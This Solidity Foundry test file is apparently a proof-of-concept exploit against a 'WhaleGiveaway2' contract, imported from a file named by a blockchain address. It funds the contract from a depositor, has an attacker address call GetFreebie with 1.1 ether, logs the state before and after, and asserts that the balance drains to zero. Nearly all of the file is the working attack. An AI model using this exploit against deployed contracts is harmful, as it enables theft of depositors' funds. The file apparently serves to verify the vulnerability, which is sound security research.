// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xf70d589d76eebdd7c12cc5eec99f8f6fa4233b9e.sol";

contract WhaleGiveaway2Test is Test {
    WhaleGiveaway2 public whaleGiveaway;
    address public constant DEPOSITOR = address(0xDECAF);
    address public constant ATTACKER = address(0xBAD);
    uint256 public constant DEPOSIT = 2 ether;
    uint256 public constant ATTACK_AMOUNT = 1.1 ether;

    // The test contract may receive Ether from the target contract
    receive() external payable {}

    function setUp() public {
        whaleGiveaway = new WhaleGiveaway2();
        
        // Deposit funds from a legitimate user
        vm.deal(DEPOSITOR, DEPOSIT);
        vm.prank(DEPOSITOR);
        payable(address(whaleGiveaway)).transfer(DEPOSIT);
    }

    function test_GetFreebie_drains_contract() public {
        console.log("--- BEFORE-Trigger State ---");
        uint256 contractBalanceBefore = address(whaleGiveaway).balance;
        uint256 attackerContributionBefore = whaleGiveaway.participantContributions(ATTACKER);
        uint256 totalParticipantsBefore = whaleGiveaway.totalParticipants();
        
        console.log("Contract ETH balance:          ", contractBalanceBefore);
        console.log("Attacker contribution:         ", attackerContributionBefore);
        console.log("Total participants count:      ", totalParticipantsBefore);
        console.log("");

        console.log("--- Trigger Attack: GetFreebie ---");
        // Record initial contract balance
        uint256 initialContractBalance = address(whaleGiveaway).balance;
        assertTrue(initialContractBalance > 0, "Contract should have initial balance");

        // Attack: Call GetFreebie with more than 1 ether
        vm.deal(ATTACKER, ATTACK_AMOUNT);
        vm.prank(ATTACKER);
        whaleGiveaway.GetFreebie{value: ATTACK_AMOUNT}();

        console.log("--- AFTER-Trigger State ---");
        uint256 contractBalanceAfter = address(whaleGiveaway).balance;
        uint256 attackerContributionAfter = whaleGiveaway.participantContributions(ATTACKER);
        uint256 totalParticipantsAfter = whaleGiveaway.totalParticipants();
        
        console.log("Contract ETH balance:          ", contractBalanceAfter);
        console.log("Attacker contribution:         ", attackerContributionAfter);
        console.log("Total participants count:      ", totalParticipantsAfter);
        console.log("");

        // Verify contract balance is fully drained
        uint256 newContractBalance = address(whaleGiveaway).balance;
        assertEq(newContractBalance, 0, "Contract not drained");

        // Final vulnerability verdict
        if (newContractBalance == 0) {
            console.log("Vulnerability Exists: Contract ETH balance was fully drained from %s to 0 wei", contractBalanceBefore);
        } else {
            console.log("Vulnerability not Exist: Contract still has %s wei after attack", newContractBalance);
        }
    }
}